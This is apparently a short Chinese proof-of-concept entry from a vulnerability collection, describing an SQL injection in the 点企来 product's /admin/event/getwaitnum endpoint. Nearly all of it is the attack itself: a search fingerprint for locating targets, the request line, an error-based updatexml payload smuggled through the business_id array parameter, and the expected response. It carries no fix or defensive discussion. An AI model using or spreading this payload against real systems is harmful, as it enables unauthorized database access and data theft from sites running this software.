# 点企来-getwaitnum存在SQL注入漏洞

点企来 ｜ SQL注入 ｜ —
- **指纹**：`"platform/passport/login.html"`
- **请求**：`POST /admin/event/getwaitnum HTTP/1.1`

**Payload**
```
business_id[]=exp&business_id[]=+and+updatexml(1,concat(0x7e,md5(123456)),1)&groupid=1
```
- **响应特征**：200